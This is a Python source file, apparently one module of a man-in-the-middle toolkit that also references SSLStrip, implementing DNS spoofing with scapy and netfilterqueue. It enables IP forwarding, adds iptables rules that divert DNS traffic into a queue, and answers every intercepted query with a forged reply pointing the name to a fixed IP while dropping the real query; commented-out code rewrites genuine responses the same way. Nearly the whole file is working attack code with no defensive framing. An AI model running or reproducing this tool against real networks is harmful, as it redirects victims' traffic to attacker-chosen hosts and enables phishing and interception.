from CommandModule import *
from scapy.all import *
from SSLStrip import NetSetup
from netfilterqueue import NetfilterQueue
import _thread

class DnsSpoofing(CommandModule) :
    command = "dns"
    outline = "--"
    manual = "--"
    nfqueue = {}


    def getNFQueue(self, num) :
        if None == self.nfqueue.get(num) :
            self.nfqueue[num] = NetfilterQueue()
        return self.nfqueue[num]
	

    def run(self) :
        if False == NetSetup.getInstance().checkIpForward() :
            NetSetup.getInstance().ipForward(1)


        # This rule of iptables can make a packet which is modifiable.
        queryID = 1
        checkOpt = "\"udp dpt:53 NFQUEUE num " + str(queryID) + "\""
        iptablesOpt = "-t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num " + str(queryID)
        if False == NetSetup.getInstance().checkIpTables(checkOpt) :
            NetSetup.getInstance().ipTables(iptablesOpt)

        responseID = 2
        checkOpt = "\"udp spt:53 NFQUEUE num " + str(responseID) + "\""
        iptablesOpt = "-t nat -A PREROUTING -p udp --sport 53 -j NFQUEUE --queue-num " + str(responseID)
        if False == NetSetup.getInstance().checkIpTables(checkOpt) :
            NetSetup.getInstance().ipTables(iptablesOpt)


        # DNS-Spoofing
        # _thread.start_new_thread(self.dnsCachePoisoning, (queryID, responseID))
        self.dnsCachePoisoning(responseID, queryID)


    def dnsCachePoisoning(self, responseID, queryID) :
        print("# DNS cache poisoning...")
        # sniff(lfilter=lambda x: x.haslayer(DNS), prn=processDns)
        try :
            self.getNFQueue(queryID).bind(queryID, self.dnsQueryCallback)
            # self.getNFQueue(responseID).bind(responseID, self.dnsResponseCallback)

            self.getNFQueue(queryID).run()
            # self.getNFQueue(responseID).run()

        except KeyboardInterrupt :
            self.getNFQueue(queryID).unbind()
            # self.getNFQueue(responseID).unbind()

            NetSetup.getInstance().ipForward(0)
            iptablesOpt = "-t nat -F"
            NetSetup.getInstance().ipTables(iptablesOpt)


    def dnsQueryCallback(self, packet) :
        print("# DNS Query")
        resq = self.makeDnsResponse(packet)
        send(resq)
        packet.drop()


    """
    def dnsResponseCallback(self, packet) :
        print("# DNS Response")
        payload = IP(packet.get_payload())
        payload[DNS].an = DNSRR(rrname="naver.com", rdata="125.209.222.141")
        packet.set_payload(str(payload))
        packet.accept()
    """


    def makeDnsResponse(self, packet) :
        pkt = IP(packet.get_payload())
        fakeIp = "125.209.222.141"	# naver.com

        # resp = IP(dst=ip.src, src=ip.dst)\
        #     /UDP(dport=ip.sport, sport=dport)\
        #     /DNS(id=dns.id, qr=1, qd=dns.qd, an=DNSRR(rrname=dns.qd.qname, ttl=10, rdata=fakeIp))
        # pkt.show()
        ip = IP()
        ip.src = pkt[IP].dst
        ip.dst = pkt[IP].src

        udp = UDP()
        udp.sport = pkt[UDP].dport
        udp.dport = pkt[UDP].sport

        dns = DNS()
        dns.id = pkt[DNS].id
        dns.opcode = 1
        dns.qdcount = 1		# question count.
        dns.ancount = 1		# answer count.
        dns.nscount = 0		# authority count.
        dns.arcount = 0		# additional count.
        dns.qd = pkt[DNS].qd
        dns.an = DNSRR(rrname=pkt[DNS].qd.qname, type=1, rclass=0x0001, ttl=25740, rdlen=4, rdata=fakeIp)

        print("Sending the fake DNS reply to %s:%s" % (ip.dst, udp.dport))
        resp = ip/udp/dns
        # resp.show()
        return resp


"""
# scapy.layers.dns
# scapy.packet.Packet = packet
def processDns(packet) :
    # DNSQR : DNS Question Record
    if DNSQR in packet and packet.dport == 53 :
	    print("# queries...")
    # DNSRR : DNS Resource Record
    elif DNSRR in packet and packet.sport == 53 :
        print("# response...")
    else :
        print("It is not a DNS packet")
        pass

    if IP in packet :
        ip_src = packet[IP].src
        ip_dst = packet[IP].dst
        if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0 :
            print(str(ip_src) + " -> " + str(ip_dst) + " : " + "(" + str(packet.getlayer(DNS).qd.qname) + ")")
        elif packet.haslayer(DNS) and packet.getlayer(DNS).rr == 0 :
            print(str(ip_src) + " -> " + str(ip_dst) + " : " + "(" + str(packet.getlayer(DNS).qd.qname) + ")")
"""



if __name__ == '__main__' :
    a = DnsSpoofing()
    a.run();
